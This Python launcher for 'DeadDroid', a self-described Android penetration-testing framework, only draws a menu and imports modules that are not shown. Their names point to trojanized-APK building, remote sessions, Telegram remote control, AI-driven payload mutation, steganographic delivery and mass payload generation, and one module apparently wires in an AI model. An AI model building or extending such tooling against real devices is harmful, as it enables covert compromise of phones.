#!/usr/bin/env python3
"""
DeadDroid v2.0 — Android Penetration Testing Framework
Author  : faizzyhon
GitHub  : https://github.com/faizzyhon
Website : https://faizzyhon.dev
Telegram: https://t.me/faizzyhon

For authorised penetration testing and security research only.
"""

import sys
import os

# Ensure Python 3.10+
if sys.version_info < (3, 10):
    print("DeadDroid requires Python 3.10 or higher.")
    sys.exit(1)

from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from rich.panel import Panel

from core.banner import show_banner
from core.utils import init_workspace, get_local_ip, is_linux
from core.ai_assistant import ai_status
import config as cfg

console = Console()


MAIN_MENU = {
    # ── Core ────────────────────────────────────────────────────────────────
    "1":  ("Payload Generator",            "core.payload_gen",      "interactive_generate"),
    "2":  ("APK Binder",                   "core.apk_binder",       "interactive_bind"),
    "3":  ("Session Manager",              "core.session_mgr",      "interactive_sessions"),
    "4":  ("ngrok Tunnel Manager",         "core.ngrok_handler",    "interactive_ngrok"),
    "5":  ("Network & Port Forwarding",    "core.network",          "interactive_network"),
    "6":  ("Extra Features",               "core.extras",           "interactive_extras"),
    "7":  ("Report Generator",             "core.reporter",         "interactive_report"),
    "8":  ("AI Assistant (Claude)",        "core.ai_assistant",     "interactive_ai"),
    # ── Exclusive features ──────────────────────────────────────────────────
    "9":  ("Live Dashboard",               "core.dashboard",        "interactive_dashboard"),
    "10": ("Telegram Remote Control",      "core.telegram_bot",     "interactive_telegram"),
    "11": ("Campaign Manager",             "core.campaign",         "interactive_campaign"),
    "12": ("Payload DNA Tracker",          "core.payload_dna",      "interactive_dna"),
    "13": ("AI Mutation Engine",           "core.ai_mutator",       "interactive_mutator"),
    "14": ("Steganography Delivery",       "core.stego_delivery",   "interactive_stego"),
    "15": ("Android CVE Scanner",          "core.cve_scanner",      "interactive_cve"),
    "16": ("Mass Payload Generator",       "core.mass_payload",     "interactive_mass"),
    # ── System ──────────────────────────────────────────────────────────────
    "c":  ("Configuration",                "config",                "interactive_config"),
    "0":  ("Exit",                         None,                    None),
}


def show_status_bar():
    local_ip  = get_local_ip()
    ai_str    = ai_status()
    linux_str = "[green]Linux[/]" if is_linux() else "[yellow]Non-Linux (limited tools)[/]"
    console.print(
        Panel(
            f"[dim]IP:[/] [cyan]{local_ip}[/]  |  "
            f"[dim]OS:[/] {linux_str}  |  "
            f"[dim]AI:[/] {ai_str}",
            border_style="dim",
            padding=(0, 2),
        )
    )


def show_main_menu():
    from rich.columns import Columns

    icons = {
        "1": "⚡", "2": "🔧", "3": "📡", "4": "🌐", "5": "🔀",
        "6": "✨", "7": "📝", "8": "🤖",
        "9": "📊", "10": "📱", "11": "🗂️", "12": "🧬",
        "13": "🔬", "14": "🖼️", "15": "🛡️", "16": "⚙️",
        "c": "⚙️", "0": "🚪",
    }

    core_table = Table(show_header=False, box=None, padding=(0, 1))
    core_table.add_column("Key",  style="bold yellow", width=5)
    core_table.add_column("Name", style="white")
    core_keys = ["1","2","3","4","5","6","7","8"]
    for k in core_keys:
        name = MAIN_MENU[k][0]
        core_table.add_row(f"[{k}]", f"{icons[k]} {name}")

    excl_table = Table(show_header=False, box=None, padding=(0, 1))
    excl_table.add_column("Key",  style="bold magenta", width=5)
    excl_table.add_column("Name", style="white")
    excl_keys = ["9","10","11","12","13","14","15","16"]
    for k in excl_keys:
        name = MAIN_MENU[k][0]
        excl_table.add_row(f"[{k}]", f"{icons[k]} {name}")

    sys_table = Table(show_header=False, box=None, padding=(0, 1))
    sys_table.add_column("Key",  style="bold dim", width=5)
    sys_table.add_column("Name", style="dim")
    for k in ["c", "0"]:
        name = MAIN_MENU[k][0]
        sys_table.add_row(f"[{k}]", f"{icons[k]} {name}")

    from rich.layout import Layout
    layout = Layout()
    layout.split_row(
        Layout(Panel(core_table, title="[bold cyan]Core Modules[/]",      border_style="cyan")),
        Layout(Panel(excl_table, title="[bold magenta]★ Exclusive[/]",    border_style="magenta")),
        Layout(Panel(sys_table,  title="[dim]System[/]",                  border_style="dim"), ratio=1),
    )
    console.print(layout)


def run():
    init_workspace()
    show_banner()
    show_status_bar()

    while True:
        console.print()
        show_main_menu()

        choice = Prompt.ask(
            "\n[bold red]deaddroid[/][dim]>[/]",
            choices=list(MAIN_MENU.keys()),
            default="0",
            show_choices=False,
        )

        if choice == "0":
            console.print("\n[bold red]Goodbye. Stay legal, stay ethical.[/]\n")
            break

        name, module_path, func_name = MAIN_MENU[choice]

        try:
            import importlib
            module = importlib.import_module(module_path)
            func   = getattr(module, func_name)
            console.print()
            func()
        except ImportError as e:
            console.print(f"[red]✘ Import error:[/] {e}")
        except KeyboardInterrupt:
            console.print("\n[yellow]Interrupted — returning to menu.[/]")
        except Exception as e:
            console.print(f"[red]✘ Error in {name}:[/] {e}")
            if os.environ.get("DEADDROID_DEBUG"):
                import traceback
                traceback.print_exc()


if __name__ == "__main__":
    run()
